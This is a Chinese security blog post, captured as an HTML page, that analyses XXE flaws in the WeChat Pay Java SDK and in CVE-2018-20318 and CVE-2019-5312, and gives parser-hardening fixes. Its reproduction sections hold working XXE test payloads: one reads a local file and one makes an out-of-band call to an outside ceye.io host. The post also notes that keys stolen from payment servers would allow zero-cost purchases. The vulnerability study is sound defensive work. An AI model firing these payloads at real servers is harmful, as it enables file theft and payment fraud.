@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web渗透,XXE 实例利用," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[TOC] XXE实例分析在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。 ex1漏洞原理 微信SDK XXE漏洞分析1  没有找到原漏洞代码，看到原漏洞修复后代码：1https://pay.weixin.qq.com/wiki/doc/api/download/WxP">
+<meta name="keywords" content="Web渗透,XXE 实例利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE 示例及利用-java—SDK-1">
+<meta property="og:url" content="http://yoursite.com/2019/01/28/Web渗透/XXE/XXE实例及利用2/index.html">
+<meta property="og:site_name" content="吾善养浩然气">
+<meta property="og:description" content="[TOC] XXE实例分析在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。 ex1漏洞原理 微信SDK XXE漏洞分析1  没有找到原漏洞代码，看到原漏洞修复后代码：1https://pay.weixin.qq.com/wiki/doc/api/download/WxP">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-11T04:33:57.946Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE 示例及利用-java—SDK-1">
+<meta name="twitter:description" content="[TOC] XXE实例分析在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。 ex1漏洞原理 微信SDK XXE漏洞分析1  没有找到原漏洞代码，看到原漏洞修复后代码：1https://pay.weixin.qq.com/wiki/doc/api/download/WxP">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/28/Web渗透/XXE/XXE实例及利用2/"/>
+
+
+
+
+
+  <title>XXE 示例及利用-java—SDK-1 | 吾善养浩然气</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">吾善养浩然气</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/28/Web渗透/XXE/XXE实例及利用2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="blackj liuyun">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="吾善养浩然气">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE 示例及利用-java—SDK-1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-28T22:21:04+08:00">
+                2019-01-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>[TOC]</p>
+<h1 id="XXE实例分析"><a href="#XXE实例分析" class="headerlink" title="XXE实例分析"></a>XXE实例分析</h1><p>在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。</p>
+<h2 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul>
+<li>微信SDK XXE漏洞分析1</li>
+</ul>
+<p>没有找到原漏洞代码，看到原漏洞修复后代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</span><br></pre></td></tr></table></figure></p>
+<p>在这个案例中，漏洞逻辑为：<br>微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何文件，一般支付服务器均为核心服务器，出现XXE导致任意文件。另外，一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品。</p>
+<p>因为白盒分析java实在有点强人所难，所以站在前人的肩膀上，一步到位，先看看出现这个漏洞的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/github/wxpay/sdk/WXPayUtil文件</span><br><span class="line">public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();</span><br><span class="line">            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();</span><br><span class="line">            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">            org.w3c.dom.Document doc = documentBuilder.parse(stream);</span><br><span class="line">            doc.getDocumentElement().normalize();</span><br><span class="line">            NodeList nodeList = doc.getDocumentElement().getChildNodes();</span><br><span class="line">            for (int idx = 0; idx &lt; nodeList.getLength(); ++idx) &#123;</span><br><span class="line">                Node node = nodeList.item(idx);</span><br><span class="line">                if (node.getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                    org.w3c.dom.Element element = (org.w3c.dom.Element) node;</span><br><span class="line">                    data.put(element.getNodeName(), element.getTextContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                stream.close();</span><br><span class="line">            &#125; catch (Exception ex) &#123;</span><br><span class="line">                // do nothing</span><br><span class="line">            &#125;</span><br><span class="line">            return data;</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            WXPayUtil.getLogger().warn(&quot;Invalid XML, can not convert to map. Error message: &#123;&#125;. XML content: &#123;&#125;&quot;, ex.getMessage(), strXML);</span><br><span class="line">            throw ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里 可以看出xmlToMap 方法用作将string转换成map,所用的xml解析器直接处理了xml字符串，这种直接处理xml字符串，在服务端没有禁止外部dtd应用的时候，造成了XXE漏洞。</p>
+<ul>
+<li>详情分析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); </span><br><span class="line">这个地方使用了java 中的hashmap，（Hash算法就是根据某个算法将一系列目标对象转换成地址，当要获取某个元素的时候，只需要将目标对象做相应的运算获得地址，直接获取。）</span><br><span class="line">对hashmap不熟悉的朋友可以看一下 https://www.cnblogs.com/dreamroute/p/3843600.html</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>关键解析出现在以下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.w3c.dom.Document doc = documentBuilder.parse(stream);</span><br><span class="line">doc.getDocumentElement().normalize();</span><br></pre></td></tr></table></figure></p>
+<p>其中，strXML的内存中数据流使用parse函数处理，跟踪parse函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Document parse(InputStream is)</span><br><span class="line">    throws SAXException, IOException &#123;</span><br><span class="line">    if (is == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;InputStream cannot be null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InputSource in = new InputSource(is);</span><br><span class="line">    return parse(in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>return的parse（in） 类似于xml解析器 将xml转换为xmlDOM，涉及到到DOM解析XML，详情可以参考下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/guchuanhang/article/details/51866114</span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>测试代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.github.wxpay.sdk;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void TestXxe()&#123;</span><br><span class="line">        String xmlstr = &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt; \n&quot; +</span><br><span class="line">                &quot;&lt;!DOCTYPE xxe [\n&quot; +</span><br><span class="line">                &quot;&lt;!ELEMENT name ANY &gt;\n&quot; +</span><br><span class="line">                &quot;&lt;!ENTITY xxe SYSTEM \&quot;file://1.txt\&quot; &gt;]&gt;\n&quot; +</span><br><span class="line">                &quot;&lt;root&gt;\n&quot; +</span><br><span class="line">                &quot;&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&quot; +</span><br><span class="line">                &quot;&lt;/root&gt;&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(xmlstr);</span><br><span class="line">            System.out.println(&quot;+++++++++++++++++=&quot;);</span><br><span class="line">            //System.out.println(WXPayUtil.isSignatureValid(xmlstr,config.getkey()));</span><br><span class="line">            Map&lt;String,String&gt; hm = WXPayUtil.xmlToMap(xmlstr);</span><br><span class="line">            System.out.println(&quot;+++++++++++++++++=&quot;);</span><br><span class="line">            System.out.println(hm);</span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] argvs)&#123;</span><br><span class="line">        System.out.println(&quot;11111&quot;);</span><br><span class="line">        test2 test3 = new test2();</span><br><span class="line">        test3.Test2();</span><br><span class="line">        //WXPayUtil WXXxe = new WXPayUtil();//调用存在漏洞的代码</span><br><span class="line">        //WXXxe.mapToXml();</span><br><span class="line">        TestXxe();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在下载的漏洞示例代码中，已经是更新后的代码了，所以为了使漏洞复现，得注释掉其中部分禁止函数。</p>
+<p>当配置documentBuilderFactory.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl&quot;</a>, true)为true时， 完全禁止DTD实体的使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在 com.github.wxpay.sdk.WXPayXmlUtil函数中，进行了安全配置</span><br><span class="line">documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); </span><br><span class="line"></span><br><span class="line">报错：[Fatal Error] :2:10: 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。</span><br></pre></td></tr></table></figure></p>
+<p>单独将该配置该为false，可以使用内部实体调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;11111111&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">正常反馈</span><br><span class="line">&#123;name=111111&#125;</span><br></pre></td></tr></table></figure></p>
+<p>使用外部实体时，因为本例子中使用的其他防护措施中，导致了禁止外部实体,测试时可以将以下防护注释掉。这个时候就可以正常进行外部实体注入。</p>
+<h3 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/github/wxpay/sdk/WXPayXmlUtil中</span><br><span class="line"></span><br><span class="line">documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">        documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line">        documentBuilderFactory.setXIncludeAware(false);</span><br><span class="line">        documentBuilderFactory.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure>
+<p>详情分析 参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xerces.apache.org/xerces2-j/features.html#external-general-entities</span><br><span class="line">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</span><br></pre></td></tr></table></figure></p>
+<h2 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h2><p>在简单分析了2018/07/03左右爆出来的微信SDK XXE漏洞函数后，可以回头来看一下CVE-2018-20318和CVE-2019-5312这两个CVE。</p>
+<ul>
+<li>CVE-2018-20318</li>
+</ul>
+<p>先看最开始的这个CVE：<br>根据issus 889</p>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>已修复后漏洞代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private Document getXmlDoc() &#123;</span><br><span class="line">    if (this.xmlDoc != null) &#123;</span><br><span class="line">      return this.xmlDoc;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	    try &#123;</span><br><span class="line">	      this.xmlDoc = DocumentBuilderFactory</span><br><span class="line">	        .newInstance()</span><br><span class="line">	        .newDocumentBuilder()</span><br><span class="line">	      final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();</span><br><span class="line">	      factory.setExpandEntityReferences(false);</span><br><span class="line">	      this.xmlDoc = factory.newDocumentBuilder()</span><br><span class="line">	        .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">	      return xmlDoc;</span><br><span class="line">	    &#125; catch (SAXException | IOException | ParserConfigurationException e) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据对比：<br>原漏洞代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private Document getXmlDoc() &#123;</span><br><span class="line">    if (this.xmlDoc != null) &#123;</span><br><span class="line">      return this.xmlDoc;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	    try &#123;</span><br><span class="line">	      this.xmlDoc = DocumentBuilderFactory</span><br><span class="line">	        .newInstance()</span><br><span class="line">	        .newDocumentBuilder()</span><br><span class="line">	        .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">	      return xmlDoc;</span><br><span class="line">	    &#125; catch (SAXException | IOException | ParserConfigurationException e) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里可以明显看到，parse创建了解析器，但没有如上的对外部实体进行禁止</p>
+<p>坑点：</p>
+<p>在复现的时候，最好使用maven项目，用pom直接导入所需组件。这里需要补充一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
+<p>测试payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void testToMap() throws Exception &#123;</span><br><span class="line">    WxPayOrderQueryResult result = new WxPayOrderQueryResult();</span><br><span class="line">    result.setXmlString(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot; +</span><br><span class="line">            &quot; \n&quot; +</span><br><span class="line">            &quot;&lt;!DOCTYPE ANY [\n&quot; +</span><br><span class="line">            &quot;&lt;!ENTITY test SYSTEM \&quot;http://th9bvw.ceye.io\&quot; &gt;]&gt;\n&quot; +</span><br><span class="line">            &quot; \n&quot; +</span><br><span class="line">            &quot;&lt;root&gt;&amp;test;&lt;/root&gt; &quot;);</span><br><span class="line">    Map&lt;String, String&gt; map = result.toMap();</span><br><span class="line">    System.out.println(map);</span><br><span class="line"></span><br><span class="line">    //Assert.assertEquals(map.get(&quot;return_code&quot;), &quot;SUCCESS&quot;);</span><br><span class="line">    //Assert.assertEquals(map.get(&quot;attach&quot;), &quot;订单额外描述&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>进行函数跟踪tomap到 BaseWxPayResult.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public Map&lt;String, String&gt; toMap() &#123;</span><br><span class="line">    if (StringUtils.isBlank(this.xmlString)) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;xml数据有问题，请核实！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, String&gt; result = Maps.newHashMap();</span><br><span class="line">    Document doc = this.getXmlDoc();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      NodeList list = (NodeList) XPathFactory.newInstance().newXPath()</span><br><span class="line">        .compile(&quot;/xml/*&quot;)</span><br><span class="line">        .evaluate(doc, XPathConstants.NODESET);</span><br><span class="line">      int len = list.getLength();</span><br><span class="line">      for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">        result.put(list.item(i).getNodeName(), list.item(i).getTextContent());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (XPathExpressionException e) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + xmlString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>追溯到 getXmlDoc</p>
+<p>可以在ceye上看到原漏洞导致的结果</p>
+<h3 id="修复措施-1"><a href="#修复措施-1" class="headerlink" title="修复措施"></a>修复措施</h3><p>修改配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">documentBuilderFactory.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure></p>
+<p>查看下详情<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void setExpandEntityReferences(boolean expandEntityRef) &#123;</span><br><span class="line">        this.expandEntityRef = expandEntityRef;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个初始化设置为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private boolean expandEntityRef = true;</span><br></pre></td></tr></table></figure></p>
+<p>但是这样修复的后果就是没有什么用，导致了CVE-2019-5312的问题<br>实际中可以参照ex1中的修复 </p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul>
+<li>CVE-2019-5312<h2 id="ex3-–待补充"><a href="#ex3-–待补充" class="headerlink" title="ex3 –待补充"></a>ex3 –待补充</h2></li>
+<li>实际渗透测试生活中遇到的xxe漏洞 <h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3></li>
+</ul>
